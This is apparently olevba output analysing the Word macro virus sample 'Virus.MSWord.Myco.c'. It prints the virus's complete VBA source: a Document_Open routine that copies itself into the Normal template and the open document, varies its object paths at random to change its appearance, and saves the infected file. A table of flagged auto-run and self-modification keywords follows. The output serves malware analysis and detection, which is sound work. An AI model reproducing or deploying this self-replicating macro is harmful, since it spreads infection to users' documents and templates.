olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myco.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myco.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim A(1 To 9) As String
Dim B(1 To 9) As String
Dim C(1 To 4) As String
Dim D(1 To 6) As String
A(1) = "ActiveDocument"
A(2) = "Word.ActiveDocument"
A(3) = "Application.ActiveDocument"
A(4) = "Word.Application.ActiveDocument"
A(5) = "System.Application.ActiveDocument"
A(6) = "AddIns.Application.ActiveDocument"
A(7) = "Bookmarks.Application.ActiveDocument"
A(8) = "Documents.Application.ActiveDocument"
A(9) = "Word.System.Application.ActiveDocument"
B(1) = "NormalTemplate"
B(2) = "Word.NormalTemplate"
B(3) = "Application.NormalTemplate"
B(4) = "Word.Application.NormalTemplate"
B(5) = "System.Application.NormalTemplate"
B(6) = "AddIns.Application.NormalTemplate"
B(7) = "Bookmarks.Application.NormalTemplate"
B(8) = "Documents.Application.NormalTemplate"
B(9) = "Word.System.Application.NormalTemplate"
C(1) = ".VBProject.VBComponents(1)"
C(2) = ".VBProject.VBComponents.Item(1)"
C(3) = ".VBProject.VBComponents(""ThisDocument"")"
C(4) = ".VBProject.VBComponents.Item(""ThisDocument"")"
D(1) = "MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 33) & vbCrLf & D(1) & vbCrLf & D(2) & vbCrLf & D(3) & vbCrLf & D(4) & vbCrLf & D(5) & vbCrLf & D(6) & vbCrLf & ""End Sub"""
D(2) = A(Int((Rnd * 8) + 1)) & C(Int((Rnd * 3) + 1)) & ".CodeModule.DeleteLines 1, " & A(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.CountOfLines"
D(3) = A(Int((Rnd * 8) + 1)) & C(Int((Rnd * 3) + 1)) & ".CodeModule.AddFromString MyCode"
D(4) = B(Int((Rnd * 8) + 1)) & C(Int((Rnd * 3) + 1)) & ".CodeModule.DeleteLines 1, " & B(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.CountOfLines"
D(5) = B(Int((Rnd * 8) + 1)) & C(Int((Rnd * 3) + 1)) & ".CodeModule.AddFromString MyCode"
D(6) = A(Int((Rnd * 8) + 1)) & ".SaveAs FileName:=" & A(Int((Rnd * 8) + 1)) & ".FullName"
MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 33) & vbCrLf & D(1) & vbCrLf & D(2) & vbCrLf & D(3) & vbCrLf & D(4) & vbCrLf & D(5) & vbCrLf & D(6) & vbCrLf & "End Sub"
Application.ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, Word.ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
Documents.Application.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString MyCode
System.Application.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Word.Application.NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString MyCode
System.Application.ActiveDocument.SaveAs FileName:=AddIns.Application.ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

